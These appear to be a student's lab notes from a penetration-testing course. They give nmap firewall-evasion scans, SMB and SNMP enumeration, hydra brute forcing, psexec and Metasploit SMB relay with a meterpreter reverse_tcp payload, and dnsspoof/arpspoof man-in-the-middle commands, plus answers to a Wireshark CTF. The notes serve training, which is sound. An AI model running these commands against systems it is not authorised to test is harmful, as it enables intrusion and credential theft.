
`IF u know the host target is up add -Pn`

Silent scan 
```
nmap -Pn -sS -sC -sV demo.ine.local
```

ACK scan to spot firewalls
```
nmap -Pn -sA -sC -sV demo.ine.local
```

`unfiltered - no firewall is present`
`filtered - firewall is present`

<h2>Fragmentation</h2>
_>MTU - Maximum Transmitted Unit_
-f (multiple of 8)
```
nmap -Pn -sS -sC -sV -f 8 demo.ine.local
```

Header - 20 bytes
Payload (Data) - 8 bytes

<h2> Decoy </h2>
Example: 
GatewayIP : 10.10.2.1
HostIP : 10.10.2.2
TargetIP : 10.10.2.3
```
nmap -Pn -sC -sV -f --data-length 200 -D 10.10.2.1,10.10.2.2 10.10.2.3
```

How can nmap be configured to appear as though a scan is originating from a DNS server?
By setting the source port to 53 using the '-g' option


NetBios and SMB are two different technologies.

![[Screenshot_2025-09-17_13_45_15.png]]

`_NBTscan_ is a program for scanning IP networks for NetBIOS name information`

```
nbtscan 10.10.4.0/24
```

``nmblookup` is a command-line utility, part of the Samba suite, used to query NetBIOS names on a network and resolve them to their corresponding IP addresses`

```
nmblookup -A demo.ine.local
```

```
nmap --script nbstat.nse 
```

```
nmap --script smb-protocols
```

```
nmap --script smb-security-mode 
```


```
ls -al /usr/share/nmap/scripts/ | grep -e "smb-*"
```

```
smbclient -L demo.ine.local
```

This will list the users of SMB:
```
nmap --script smb-enum-users.nse
```

```
hydra -L usrs.txt -P pass.txt demo.ine.local smb
```

``` 
psexec.py administrator@demo.ine.local
```

```
msfconsole
use exploit/windows/smb/psexec
use auxiliary/server/socks_proxy

net view IP
```


Now, let's run nmap with proxychains to identify SMB port (445) on the pivot machine, i.e. `demo1.ine.local`

We could also specify multiple ports. But, in this case, we are only interested in SMB service.

**Command:**

```
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
```
This scan is the safest way to identify the open ports. We could use an auxiliary TCP port scanning module. But those are very aggressive and can kill your session.

<h2> SNMP - Simple Network Management Protocol </h2>
<i>Port Number: 161 udp</i>

```
ls /usr/share/nmap/scripts/ | grep -i "snmp*"
```

```
nmap -sU -p 161 --script=snmp-brute demo.ine.local
```

```
snmpwalk -v 1 -c public demo.ine.local
```

Which UDP port is used for sending SNMP traps or notifications?
-162

```
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
```

```
msfconsole -q
use exploit/windows/smb/psexec
show options
```

```
set RHOSTS demo.ine.local
set SMBUSER administrator
set SMBPASS elizabeth
exploit
``` 

<h2> SMB Relay attack </h2>

	1.Interception
	2.Capturing Authentication
	3.Relayig to a Legitimate Server
	4.Gain Access
	
```
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
exploit
```

```
echo "172.16.5.101 *.sportsfoo.com" > dns
```

```
dnsspoof -i eth1 -f dns
```

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

In 1st tab of Terminal:
```
arpspoof -i eth1 -t 172.1.5.5 172.16.5.1
```
In 2nd tab of Terminal:
```
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```
![[Pasted image 20250917203022.png]]

<h2>Network-Based Attacks CTF 1</h2>
Flag 1: What is the domain name(abcd.site) accessed by the infected user that returned a 200 OK response code?
`http.response.code == 200` or `http.request.method =="GET"`

Flag 2: What is the IP address, MAC address of the infected Windows client?
`10.7.10.47, 80:86:5b:ab:1e:c4`

Flag 3: Which Wireshark filter can you use to determine the victim’s hostname from NetBIOS Name Service traffic, and what is the detected hostname for this malware infection?
`nbns DESKTOP-9PEA63H`

Flag 4: Which user got infected and ran the mystery_file.ps1 PowerShell script?
`tcp contains "mystery_file.ps1"`

Flag 5: What User-Agent string indicates the traffic generated by a PowerShell script?
![[Pasted image 20250917231037.png]]

Flag 6: Which wallet extension ID is associated with the Coinbase wallet?
![[Pasted image 20250917230904.png]]